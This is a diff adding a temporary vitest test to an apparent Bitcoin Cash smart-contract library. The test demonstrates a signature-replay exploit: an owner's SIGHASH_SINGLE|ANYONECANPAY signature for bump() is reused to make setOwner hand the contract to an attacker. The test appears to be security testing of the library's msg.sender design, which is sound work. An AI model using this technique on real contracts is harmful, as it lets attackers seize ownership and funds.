@@ -1,0 +1,85 @@
+import { describe, it, expect } from 'vitest';
+import { compileString } from './direct-compile.js';
+import { Contract, StatefulContract, Signer, SignatureTemplate } from '../src/index.js';
+import { HashType } from '../src/interfaces.js';
+import { addressToLockScript } from '../src/utils.js';
+import { hexToBin, binToHex, encodeTransaction } from '@bitauth/libauth';
+import { createTxVerifier } from '@mem-cash/validation';
+import { createTestProvider, setupStatefulUtxos } from './test-util.js';
+import { alicePriv } from './fixture/vars.js';
+
+const txVerifier = createTxVerifier({ vmVersion: 'BCH_2026_05', standard: true, skipFeePolicy: true });
+const CHAIN = { height: 133700, medianTimePast: 1700000000 };
+const verify = (tx: any, src: any): string => {
+  const r = txVerifier.verify(binToHex(encodeTransaction(tx)), src, CHAIN);
+  return r.success ? 'ACCEPTED' : `REJECTED ${r.error}: ${String(r.debugMessage ?? '').slice(0, 160)}`;
+};
+
+const SRC = `pragma solidcash >=0.8.0;
+contract O() {
+  address owner;
+  int n;
+  function bump() { require(msg.sender == this.owner); this.n = this.n + 1; }
+  function setOwner(address o) { require(msg.sender == this.owner); this.owner = o; }
+}`;
+
+describe('tmp: SINGLE|ANYONECANPAY signature reuse as msg.sender', () => {
+  it('attacker takes ownership with a signature the owner made for bump()', async () => {
+    const provider = createTestProvider();
+    const alice = new Signer(alicePriv, provider);
+    const aliceLock = addressToLockScript(alice.getAddress());
+    const attackerLock = hexToBin('76a914' + 'ab'.repeat(20) + '88ac');
+    const art = compileString(SRC);
+    const contract = new Contract(art, [], { provider });
+    const { categoryId } = await setupStatefulUtxos(provider, contract, art.stateLayout!,
+      { owner: aliceLock, n: 0n }, { saltContract: true });
+    const sc = StatefulContract.withCategory(contract, categoryId);
+    await (provider as any).addUtxo(alice.getAddress(), { txid: 'e1'.repeat(32), vout: 0, satoshis: 500000n });
+
+    const describeTx = (label: string, p: any): number => {
+      let idx = -1;
+      p.sourceOutputs.forEach((o: any, i: number) => {
+        const isAlice = binToHex(o.lockingBytecode) === binToHex(aliceLock);
+        if (isAlice) idx = i;
+        console.log(`RESULT ${label} in${i} lock=${binToHex(o.lockingBytecode).slice(0, 12)}${isAlice ? ' (alice)' : ''}`
+          + ` token=${o.token ? (o.token.nft?.capability ?? 'ft') : '-'} value=${o.valueSatoshis}`);
+      });
+      console.log(`RESULT ${label} outputs=${p.transaction.outputs.length} locktime=${p.transaction.locktime} version=${p.transaction.version}`);
+      return idx;
+    };
+    const singleAcp = new SignatureTemplate(alicePriv, HashType.SIGHASH_SINGLE | HashType.SIGHASH_ANYONECANPAY);
+
+    // T1: the owner's own bump(), with the owner's input signed SINGLE|ANYONECANPAY.
+    const tb1 = await (sc.connect(alice).call as any).bump().build();
+    const p1a = tb1.buildLibauthProgram();
+    const i = describeTx('T1', p1a);
+    expect(i).toBeGreaterThanOrEqual(0);
+    tb1.inputs[i].unlocker = singleAcp.unlockP2PKH();
+    const p1 = tb1.buildLibauthProgram();
+    console.log('RESULT T1 (owner bump, owner input SINGLE|ACP):', verify(p1.transaction, p1.sourceOutputs));
+    const sig1 = p1.transaction.inputs[i].unlockingBytecode;
+    console.log(`RESULT T1 owner sig hashtype byte: 0x${sig1[sig1[0]].toString(16)}`);
+    const out1 = p1.transaction.outputs[i];
+
+    // T2: attacker's setOwner(attacker). Only the owner's T1 unlocking bytecode and output i are reused.
+    const tb2 = await (sc.connect(alice).call as any).setOwner(attackerLock).build();
+    const p2 = tb2.buildLibauthProgram();
+    const j = describeTx('T2', p2);
+    const sameOutpoint = binToHex(p1.transaction.inputs[i].outpointTransactionHash)
+      === binToHex(p2.transaction.inputs[j].outpointTransactionHash)
+      && p1.transaction.inputs[i].outpointIndex === p2.transaction.inputs[j].outpointIndex;
+    console.log(`RESULT same owner input index (${i} vs ${j}) and outpoint: ${i === j && sameOutpoint}`);
+    const t2 = {
+      ...p2.transaction,
+      inputs: p2.transaction.inputs.map((inp: any, k: number) => (k === j ? { ...inp, unlockingBytecode: sig1 } : inp)),
+      outputs: p2.transaction.outputs.map((o: any, k: number) => (k === j ? out1 : o)),
+    };
+    console.log('RESULT T2 (setOwner(attacker), owner input = T1 signature):', verify(t2, p2.sourceOutputs));
+    const t2all = {
+      ...p2.transaction,
+      inputs: p2.transaction.inputs.map((inp: any, k: number) => (k === j ? { ...inp, unlockingBytecode: sig1 } : inp)),
+    };
+    console.log('RESULT control: T1 SINGLE|ACP sig with T2 output unchanged:', verify(t2all, p2.sourceOutputs));
+    expect(true).toBe(true);
+  });
+});
